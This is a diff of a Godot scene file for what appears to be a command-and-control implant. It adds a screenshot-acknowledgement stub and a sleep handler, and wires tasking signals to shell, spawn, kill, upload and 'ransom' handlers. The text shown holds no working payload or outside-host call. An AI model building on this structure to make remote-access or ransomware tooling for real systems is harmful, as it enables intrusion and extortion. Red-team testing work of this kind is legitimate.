@@ -1,4 +1,4 @@
-[gd_scene load_steps=20 format=3 uid="uid://gjfuqrhyfrrh"]
+[gd_scene load_steps=21 format=3 uid="uid://gjfuqrhyfrrh"]
 
 [ext_resource type="Script" path="res://execute.gd" id="1"]
 [ext_resource type="Script" path="res://api.gd" id="2"]
@@ -11,9 +11,35 @@
 [ext_resource type="Script" path="res://ransom.gd" id="10"]
 [ext_resource type="Script" path="res://GUI.gd" id="11"]
 [ext_resource type="Script" path="res://transfer.gd" id="12"]
-[ext_resource type="Script" path="res://ps.gd" id="13"]
+[ext_resource type="Script" path="res://sleep.gd" id="12_bh1sf"]
 [ext_resource type="Script" path="res://kill.gd" id="14"]
 [ext_resource type="Script" path="res://ls.gd" id="15"]
+
+[sub_resource type="GDScript" id="GDScript_pld3b"]
+script/source = "extends Node
+
+var api
+
+func _ready():
+	api = $\".\".get_parent().get_node(\"api\")
+
+
+func _on_tasking_screenshot(task):
+
+	if task.has(\"command\") and task.get(\"command\") == \"screenshot\":
+
+		api.send_agent_response(
+			api.create_task_response(
+				true,
+				true,
+				task.get(\"id\"),
+				\"Processing Screenshots...\",
+			)
+		)
+	else:
+		pass
+		# TODO: error state
+"
 
 [sub_resource type="FontFile" id="1"]
 fallbacks = Array[Font]([null])
@@ -80,9 +106,6 @@ script = ExtResource("14")
 [node name="execute" type="Node" parent="."]
 script = ExtResource("1")
 
-[node name="ps" type="Node" parent="."]
-script = ExtResource("13")
-
 [node name="config" type="Node" parent="."]
 script = ExtResource("3")
 
@@ -100,6 +123,12 @@ script = ExtResource("5")
 
 [node name="ransom" type="Node" parent="."]
 script = ExtResource("10")
+
+[node name="screenshot" type="Node" parent="."]
+script = SubResource("GDScript_pld3b")
+
+[node name="sleep" type="Node" parent="."]
+script = ExtResource("12_bh1sf")
 
 [node name="CallbackTimer" type="Timer" parent="."]
 script = ExtResource("8")
@@ -176,10 +205,14 @@ text = "Verify"
 [connection signal="kill" from="tasking" to="kill" method="_on_tasking_kill"]
 [connection signal="ls" from="tasking" to="ls" method="_on_tasking_ls"]
 [connection signal="post_response" from="tasking" to="api" method="_on_tasking_post_response"]
-[connection signal="ps" from="tasking" to="ps" method="_on_tasking_ps"]
 [connection signal="ransom" from="tasking" to="ransom" method="_on_tasking_ransom"]
 [connection signal="rm" from="tasking" to="execute" method="_on_tasking_rm"]
+[connection signal="screenshot" from="tasking" to="transfer" method="_on_tasking_screenshot"]
+[connection signal="screenshot_chunk" from="tasking" to="transfer" method="_on_tasking_screenshot_chunk"]
+[connection signal="screenshot_start" from="tasking" to="transfer" method="_on_tasking_screenshot_start"]
 [connection signal="shell" from="tasking" to="execute" method="_on_tasking_shell"]
+[connection signal="sleep" from="tasking" to="sleep" method="_on_tasking_sleep"]
+[connection signal="spawn" from="tasking" to="execute" method="_on_tasking_spawn"]
 [connection signal="upload" from="tasking" to="transfer" method="_on_tasking_upload"]
 [connection signal="upload_chunk" from="tasking" to="transfer" method="_on_tasking_upload_chunk"]
 [connection signal="upload_start" from="tasking" to="transfer" method="_on_tasking_upload_start"]
